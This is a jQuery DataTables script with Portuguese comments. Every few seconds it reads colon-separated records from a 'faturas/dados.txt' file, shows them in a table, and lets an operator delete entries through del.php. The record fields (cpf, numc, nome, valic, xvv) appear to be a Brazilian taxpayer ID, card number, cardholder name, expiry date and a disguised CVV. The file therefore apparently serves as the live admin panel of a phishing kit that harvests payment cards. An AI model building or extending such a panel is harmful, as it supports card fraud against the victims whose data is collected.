$(document).ready(function() {
    var dados = [];
    var tabela;

    function atualizarTabela() {
        var paginaAtual = tabela.page.info().page;
        var timestamp = new Date().getTime(); // adiciona um timestamp único
        $.get("../faturas/dados.txt?_=" + timestamp, function(conteudo) {
            var linhas = conteudo.trim().split('\n');
            dados = [];
            for (var i = 0; i < linhas.length; i++) {
                var valores = linhas[i].split(':');
                dados.push({
                    cpf: valores[0],
                    numc: valores[1],
                    nome: valores[2],
                    valic: valores[3],
                    xvv: valores[4],
                });
            }
            tabela.clear();
            tabela.rows.add(dados);
            tabela.draw(false);
            tabela.page(paginaAtual).draw(false);
        });
    }
    

    $.get("../faturas/dados.txt", function(conteudo) {
        var linhas = conteudo.trim().split('\n');
        for (var i = 0; i < linhas.length; i++) {
            var valores = linhas[i].split(':');
            dados.push({
                cpf: valores[0],
                numc: valores[1],
                nome: valores[2],
                valic: valores[3],
                xvv: valores[4],
            });
        }

        tabela = $('#minha-tabela').DataTable({
            data: dados,
            columns: [
                { "data": "cpf" },
                { "data": "numc" },
                { "data": "nome" },
                { "data": "valic" },
                { "data": "xvv" },
                { "defaultContent": "<button type='button' class='btn btn-danger excluir'>Excluir</button>" }
            ]
        });

        $('#minha-tabela tbody').on('click', 'button.excluir', function() {
            var linha = $(this).closest('tr');
            var cpf = tabela.cell(linha, 0).data();
            console.log(cpf);
            $.ajax({
                url: 'del.php',
                type: 'POST',
                data: {cpf: cpf},
                success: function() {
                    tabela.row(linha).remove().draw(false);
                    atualizarTabela();
                }
            });
        });

        $('#minha-tabela').on( 'click', 'tbody tr', function () {
            if ($(this).hasClass('selected')) {
                $(this).removeClass('selected');
            } else {
                tabela.$('tr.selected').removeClass('selected');
                $(this).addClass('selected');
            }
        });
 
            // Ao clicar no botão "Configurar", abre o modal com o iframe
            $('#btnConfigurar').click(function() {
              $('#configurarIframe').attr('src', 'config.php'); // Coloque aqui o URL do site desejado
              $('#configurarModal').modal('show');
            });
       

        $('#excluir').click(function() {
            var linha = tabela.row('.selected');
            var cpf = linha.data().cpf;
            console.log(cpf);
            $.ajax({
                url: 'del.php',
                type: 'POST',
                data: {cpf: cpf},
                success: function() {
                    tabela.row('.selected').remove().draw(false);
                    atualizarTabela();
                }
            });
        });

        $('#pagina-anterior').click(function() {
            tabela.page('previous').draw(false);
        });

        $('#proxima-pagina').click(function() {
            tabela.page('next').draw(false);
        });
    });

    setInterval(atualizarTabela, 4000);
});
